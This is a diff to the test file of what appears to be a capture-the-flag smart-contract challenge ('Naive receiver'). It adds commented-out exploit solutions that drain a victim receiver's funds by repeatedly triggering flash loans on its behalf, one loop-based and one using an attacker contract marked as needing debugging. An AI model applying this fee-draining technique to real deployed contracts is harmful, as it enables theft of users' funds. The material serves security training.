@@ -31,6 +31,26 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+
+        // Solution 1
+        // for (let i = 0; i < 10; i++) {
+        //     await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
+        // }
+
+        /**
+         * Draining the wallet by calling the flash loan for the user for 10 times in 10 tx
+         */
+
+        // Solution 2
+        // const FlashLoanAttackerFactory = await ethers.getContractFactory("FlashLoanAttacker", deployer);
+        // this.attack = await FlashLoanAttackerFactory.deploy();
+
+        // await this.attack.connect(attacker).attackBorrower(this.pool.address, this.receiver.address, 10);
+
+        /**
+         * Same logic but using contract to execute in 1 tx
+         * TODO: contract need to be debugged
+         */
     });
 
     after(async function () {
